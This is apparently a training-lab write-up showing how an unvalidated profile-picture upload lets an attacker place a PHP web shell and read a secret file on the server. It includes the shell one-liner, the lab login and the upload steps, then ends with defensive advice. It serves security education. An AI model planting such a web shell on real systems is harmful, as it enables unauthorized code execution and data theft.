# Lab: Remote code execution via web shell upload

## Description
This lab contains a file upload vulnerability. The application allows users to upload profile pictures without properly validating the file content or type.

## Analysis
The application has an upload feature for profile pictures. It expects an image file. However, if it doesn't check the file extension or content, we can upload a PHP script. Once uploaded, we can navigate to the file's URL to execute the script on the server.

## Exploitation
I need to upload a web shell and read `/home/carlos/secret`.

### Steps
1. Create a simple PHP web shell: `<?php echo file_get_contents('/home/carlos/secret'); ?>`. Save it as `shell.php`.
2. Log in as `wiener:peter`.
3. Go to your account page and upload `shell.php`.
4. The application confirms the upload: "The file avatars/shell.php has been uploaded."
5. Navigate to the uploaded file: `/avatars/shell.php`.
6. The response will contain the secret.

## Payload
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

## Takeaways
- File upload vulnerabilities can lead to full system compromise via remote code execution.
- Always validate the file extension against a strict whitelist.
- Validate the file content (e.g., using a library to check if it's a valid image).
- Store uploaded files in a directory where execution is disabled.
- Rename uploaded files to something unpredictable.
